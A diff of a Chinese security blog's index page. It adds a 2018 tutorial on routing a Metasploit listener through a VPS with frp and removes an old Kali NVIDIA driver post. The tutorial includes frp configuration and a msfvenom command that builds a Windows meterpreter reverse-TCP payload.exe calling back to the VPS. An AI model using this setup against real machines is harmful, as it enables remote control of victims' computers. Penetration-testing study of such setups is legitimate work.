@@ -274,6 +274,104 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-Frp＋VPS打造外网Meatsploit" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/04/19/Frp＋VPS打造外网Meatsploit/" class="article-date">
+      <time datetime="2018-04-19T02:47:05.267Z" itemprop="datePublished">2018-04-19</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="Frp结合VPS打造外网Msf"><a href="#Frp结合VPS打造外网Msf" class="headerlink" title="Frp结合VPS打造外网Msf"></a>Frp结合VPS打造外网Msf</h2><ul>
+<li><strong>前言：</strong></li>
+</ul>
+<p>本来一开始是在Vps上直接安装的MSF,想安装的可以试试，附一键脚本：</p>
+<pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall
+
+chmod 755 msfinstall &amp;&amp; ./msfinstall
+</code></pre><p>可以用，但是总是时不时崩溃（可能是配置太低），烦的一pi.<br>然后就去Google找到了ngrok的端口转发教程。试了下，可以用，不过用起来反应很慢，时不时还掉线，尼玛啊，最坑的是有的平台（VIP是不可能开的，这辈子都不可能）不能固定外网端口，启动一次客户端就换一个端口，每次都要改Payload，费劲。<br>然后试了下用Frp来转发，相比起来简直不要太爽。</p>
+<p> <strong>1. 准备工作：</strong></p>
+<blockquote>
+<p>VPS一台<br>FRP  ##下载地址：<a href="https://github.com/fatedier/frp/releases（根据自己的VPS选择对应的版本）" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases（根据自己的VPS选择对应的版本）</a></p>
+</blockquote>
+<p> <strong>２.安装步骤：</strong><br><strong>在VPS上执行（我的是Centos x64）：</strong></p>
+<pre><code>wget https://github.com/fatedier/frp/releases/download/v0.16.1/frp_0.16.1_linux_amd64.tar.gz ##下载frp
+tar -zxvf frp_0.16.1_linux_amd64.tar.gz ##解压 
+cd frp_0.16.1_linux_amd64
+rm frpc&amp;&amp;rm frpc.ini  ##这个是客户端文件，用不上，删不删随意。
+./frps -c frps.ini　　##默认配置文件启动服务端。
+</code></pre><p><strong>在自己电脑执行（我的是KALi x64）:</strong></p>
+<pre><code>wget https://github.com/fatedier/frp/releases/download/v0.16.1/frp_0.16.1_linux_amd64.tar.gz ##下载frp
+tar -zxvf frp_0.16.1_linux_amd64.tar.gz ##解压 
+cd frp_0.16.1_linux_amd64
+rm frps&amp;&amp;rm frps.ini  ##这个是服务端文件，用不上，删不删随意。
+./frpc -c frpc.ini　　##使用配置文件启动客户端。
+</code></pre><p> 注意frpc.ini配置文件内容（<a href="https://github.com/fatedier/frp/blob/master/README_zh.md#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">详细参考</a>）：</p>
+<pre><code>[common]
+server_addr = *.*.*.*  ##VPS的IP地址
+server_port = 7000
+
+[msf]
+type = tcp　　　　　##协议
+local_ip = *.*.*.*  ##本地内网主机IP。
+local_port = 4444　 ##本地MSF监听的端口
+remote_port = 8011  ##Payload设置的LPORT端口,LHOST为VPS的IP。
+</code></pre><p>Payload生成实例：</p>
+<pre><code>$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=VPS的IP lport=8011 -f exe -o payload.exe
+</code></pre><p>MSf监听示例：</p>
+<pre><code>Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/x64/meterpreter_reverse_tcp):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   EXITFUNC    process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)
+   EXTENSIONS                   no        Comma-separate list of extensions to load
+   EXTINIT                      no        Initialization strings for extensions
+   LHOST       172.16.1.254     yes       The listen address
+   LPORT       4444             yes       The listen port
+</code></pre><p>附一张截图：</p>
+<p>结束语：<br>当然frp不止tcp端口转发这一种用法，还可以做socks5,http代理等，其他的自行查看说明文档。<br>题外话：Freebuf已经很多这种文章了,没什么技术含量，纯粹为了自己用Msf方便。不喜勿喷。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-encrypt in linux" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -986,70 +1084,6 @@ last -f wtmp 用last命令查看wtmp文件（直接打开无法查看）
         <p class="article-more-link">
           <a href="/2018/01/18/linux入侵检测基础/#more">more >></a>
         </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-kali安装NVIDIA显卡驱动" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/01/10/kali安装NVIDIA显卡驱动/" class="article-date">
-      <time datetime="2018-01-10T01:32:48.000Z" itemprop="datePublished">2018-01-10</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/10/kali安装NVIDIA显卡驱动/">kali安装NVIDIA显卡驱动</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>安装参考链接<br><a href="https://forums.kali.org/showthread.php?35748-TUTORIAL-Installing-official-NVIDIA-driver-in-Optimus-laptop" target="_blank" rel="noopener">https://forums.kali.org/showthread.php?35748-TUTORIAL-Installing-official-NVIDIA-driver-in-Optimus-laptop</a><br>验证：<br><a href="https://docs.kali.org/general-use/install-nvidia-drivers-on-kali-linux" target="_blank" rel="noopener">https://docs.kali.org/general-use/install-nvidia-drivers-on-kali-linux</a></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/笔记/">笔记</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/NVIDIA/">NVIDIA</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kali/">kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/驱动/">驱动</a></li></ul>
-    </div>
-
       
       <div class="clearfix"></div>
     </div>
